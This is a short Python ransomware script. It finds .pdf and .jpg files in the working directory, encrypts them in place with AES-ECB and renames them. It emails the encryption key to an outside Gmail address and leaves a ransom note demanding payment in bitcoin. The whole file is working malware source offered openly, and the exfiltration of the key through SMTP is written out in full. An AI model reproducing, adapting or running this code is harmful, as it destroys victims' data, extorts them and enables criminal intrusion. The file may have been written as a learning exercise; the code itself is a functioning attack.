#Importing the required libraries
import os
import random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
from email.message import EmailMessage
import ssl
import smtplib

#search for .pdf and .jpg files
def search_for_files():
    results = []
    for file in os.listdir():
        file_name, file_extension = os.path.splitext(file)
        # if the file is jped or pdf
        # we append the file name in the results
        if file_extension == ".pdf" or file_extension == ".jpg" :
            results.append(file)

    return results


#generate the random key
def generate_key():
    return random.randbytes(16) # generate 16 random bytes for the key required


#encrypt the files with the AES cipher in ECB mode
def encryptAESECB(files, key):
    for file in files:
        with open(file,'rb') as thefile: #opening the file in order to read the file's content
            plaintext = thefile.read()
        cipher = AES.new(key,AES.MODE_ECB) #create the object to use AES ECB
        ciphertext = cipher.encrypt(pad(plaintext,AES.block_size)) # encrypt the file using the function pad of python3 Crypto library
        with open(file,'wb') as thefile: #opening the file in order to write the encrypted file contents
            thefile.write(ciphertext)


#rename the encrypted files
def rename_files(files):
    for file in files:
        os.rename(file, f'encrypted-{file}')


#send KEY via email
def send_key(key):
    email_sender = "emailsender@gmail.com"
    email_pass = " " # specify the email password
    email_receiver = 'emailreceiver@gmail.com' 

    subject = "Key"
    body = str(key)

    # setting the email's content
    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['subject'] = subject
    em.set_content(body)
    context = ssl.create_default_context()

    #login with credentials and sending the email
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context = context) as smtp:
        smtp.login(email_sender, email_pass)
        smtp.sendmail(email_sender, email_receiver, em.as_string())


def inform_victim():
    address = "3d57253306ebf47c7d2ae633f67c11109746ef65e8e315433307fc7eadb1131ea5d4d9240c02591ddb39c3d725d9cd10121ba20"
    with open('message.txt', 'w') as msg:
        msg.write(f"Your files have been encrypted\nIf you want them back, send 100eyro in BTC in this wallet address: \n{address}")



files = []
files = search_for_files()
key = generate_key()
encryptAESECB(files, key)
rename_files(files)
send_key(key)
inform_victim()
